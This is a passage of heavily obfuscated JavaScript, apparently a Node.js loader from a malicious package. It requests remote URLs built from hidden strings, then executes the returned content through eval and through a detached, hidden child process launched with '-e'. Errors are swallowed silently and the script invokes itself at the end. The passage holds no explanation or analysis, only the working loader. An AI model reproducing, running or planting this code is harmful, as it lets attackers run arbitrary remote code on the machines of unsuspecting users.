_0x9df163[_0x42dd94(0x1b6)](_0x40448d,_0x23c91e);},'XHNyr':_0x9df163[_0x320ae6(0x112)],'eAmtO':_0x9df163[_0x320ae6(0xe7)],'ZYBBe':function(_0x3e84e2,_0x5c0248){const _0x3f74e7=_0x320ae6;return _0x9df163[_0x3f74e7(0xfc)](_0x3e84e2,_0x5c0248);},'FWUiH':_0x9df163[_0x320ae6(0x1a6)],'smCxl':function(_0x30f2b3,_0x3b4378){const _0x508aeb=_0x320ae6;return _0x9df163[_0x508aeb(0x94)](_0x30f2b3,_0x3b4378);},'LBjUj':_0x9df163[_0x320ae6(0x144)],'RpPIO':_0x9df163[_0x320ae6(0x199)],'EreqP':_0x9df163[_0x320ae6(0xca)]};let _0x67c2bf=http[_0x320ae6(0xc7)]({..._0x11ec1f,'method':_0x188457},_0x3ab5c7=>{const _0x17709d=_0x320ae6,_0x31a947={'RsZph':function(_0x3b6db8,_0x40fce6){const _0x93e689=_0x355e;return _0x34a894[_0x93e689(0x104)](_0x3b6db8,_0x40fce6);},'tavZt':_0x34a894[_0x17709d(0x10a)],'LssUT':function(_0x1f6ba3,_0xee0496){const _0x3db9b9=_0x17709d;return _0x34a894[_0x3db9b9(0x104)](_0x1f6ba3,_0xee0496);},'mjCAw':_0x34a894[_0x17709d(0x1b0)]};if(_0x34a894[_0x17709d(0xb2)](_0x34a894[_0x17709d(0xd1)],_0x188457)){try{_0x34a894[_0x17709d(0x11b)](_0x15f946,_0x34a894[_0x17709d(0x104)](_0x3fa166,_0x3ab5c7));}catch(_0x14978e){_0x34a894[_0x17709d(0x104)](_0x5a9938,_0x14978e);}_0x3ab5c7[_0x17709d(0x1b9)]();return;}let _0x333305=[];_0x3ab5c7['on'](_0x34a894[_0x17709d(0x15b)],_0x547736=>_0x333305[_0x17709d(0x198)](_0x547736)),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x154)],()=>{const _0x38253d=_0x17709d;try{let _0x247fe6=Buffer[_0x38253d(0x107)](_0x333305);if(_0x247fe6[_0x38253d(0xcd)])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0xd2)](_0x5944ee,_0x247fe6));if(_0x3ab5c7[_0x38253d(0x14b)][_0x31a947[_0x38253d(0x171)]])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0x192)](_0x3fa166,_0x3ab5c7));_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x31a947[_0x38253d(0x192)](Error,_0x31a947[_0x38253d(0xae)]));}catch(_0x907b81){_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x907b81);}}),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x12e)],_0x5a9938);});_0x67c2bf['on'](_0x9df163[_0x320ae6(0xca)],_0x5a9938),_0x67c2bf[_0x320ae6(0x142)]();});}return _0x123142[_0x55165e(0xfe)](_0x5e0c4c,_0x123142[_0x55165e(0x102)])[_0x55165e(0x100)](()=>_0x5e0c4c(_0x55165e(0x11a)));}async function _0x71cdd3(_0x36ed3f,_0x4cbe2e,_0x18ff88){const _0x433f4b=_0x21838c;try{let _0x42938e=await _0x123142[_0x433f4b(0xc3)](_0x5ec9c4,_0x4cbe2e,_0x36ed3f),_0x1de9e8=_0x18ff88?_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||-0xf0a+-0x135d*-0x1+-0x453)+(_0x433f4b(0xee)+_0x433f4b(0xfa))+_0x3d94ba['_H']+(_0x433f4b(0xee)+_0x433f4b(0x15e))+_0x3d94ba[_0x433f4b(0x16a)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179)):_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||0x1b1*0x2+-0x1*-0x16f9+0x207*-0xd)+(_0x433f4b(0xee)+_0x433f4b(0x132))+_0x3d94ba[_0x433f4b(0x15c)]+(_0x433f4b(0xee)+_0x433f4b(0x129))+_0x3d94ba[_0x433f4b(0x116)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179));_0x18ff88||_0x123142[_0x433f4b(0x1b4)](eval,_0x123142[_0x433f4b(0x92)](_0x1de9e8,_0x42938e)),_0x123142[_0x433f4b(0x125)](spawn,_0x123142[_0x433f4b(0x145)],['-e',_0x123142[_0x433f4b(0x9c)](_0x1de9e8,_0x42938e)],{'detached':!(-0xb2c+-0x1*-0xc13+-0xe7),'stdio':_0x123142[_0x433f4b(0xab)],'windowsHide':!(-0x1*-0x2079+0x1*-0x135a+0x1*-0xd1f)})[_0x433f4b(0x177)]();}catch(_0x51210c){}}_0x3d94ba['_V']=_0x3d94ba['i'],_0x3d94ba['_H']=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x16a)]=_0x21838c(0x17e)+_0x3b6d7d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x15c)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x181),_0x3d94ba[_0x21838c(0x116)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),await _0x123142[_0x21838c(0x125)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+(_0x21838c(0xe4)+'s')),_0x123142[_0x21838c(0xf7)],!(-0x1*0x1b55+0x1*-0x1f25+0x3a7b)),await _0x123142[_0x21838c(0xe2)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x124)),_0x123142[_0x21838c(0x13e)],!(0x135b+0x1c5f+-0x2fba));}run();

